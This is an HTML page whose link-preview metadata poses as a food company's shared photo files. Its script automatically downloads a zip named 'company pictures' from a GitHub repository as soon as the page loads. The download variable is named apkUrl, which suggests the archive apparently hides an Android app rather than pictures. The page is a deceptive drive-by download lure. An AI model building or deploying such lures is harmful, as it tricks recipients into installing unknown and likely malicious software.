<!DOCTYPE html>
<html lang="en">
<head>
  <meta property="og:title" content="شركة برنيق للمواد الغذائية">
  <meta property="og:description" content="ملفات الصور">
  <meta property="og:image" content="https://scontent-sof1-2.xx.fbcdn.net/v/t39.30808-6/317539499_188297470415120_6947359484684872225_n.jpg?_nc_cat=109&ccb=1-7&_nc_sid=6ee11a&_nc_ohc=WbVOhm_63iEQ7kNvwE_qiSf&_nc_oc=Adn_VlRvWaKQTllmJirRMwb55FeQ8RqP5iyIfh37TYzS6sgkTghveZGKZ2qSr3hF2LfcIidaGIj6mMslYnK5GCXx&_nc_zt=23&_nc_ht=scontent-sof1-2.xx&_nc_gid=_r6etBTjPljFpUepjCcEKA&oh=00_AfczjS_OHtp5bx_hVic6OEgloyWFw5S0-Xt4W9ICGhkYCg&oe=68F3FD76">
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Download</title>
    <style>
        body {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
            background-color: #f5f5f5;
        }

        h2 {
            margin-bottom: 20px;
            color: #333;
        }

        #downloadBtn {
            background-color: #4CAF50; /* Green color */
            color: white;
            padding: 15px 30px;
            font-size: 18px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s, transform 0.2s;
        }

        #downloadBtn:hover {
            background-color: #45a049;
            transform: scale(1.05);
        }

        #downloadBtn:active {
            transform: scale(0.95);
        }
    </style>
</head>
<body>
    <button id="downloadBtn">Download Now</button>

    <script>
        const apkUrl = "https://github.com/Easy-Hash/Dr-essam-mohammed/raw/refs/heads/master/company%20pictures.zip";

        function startDownload() {
            const link = document.createElement("a");
            link.href = apkUrl;
            link.target = "_blank"; // lets the browser handle the filename from the server
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }

        // Auto download on page load
        window.onload = startDownload;

        // Manual download via button
        document.getElementById("downloadBtn").addEventListener("click", startDownload);
    </script>
</body>
</html>
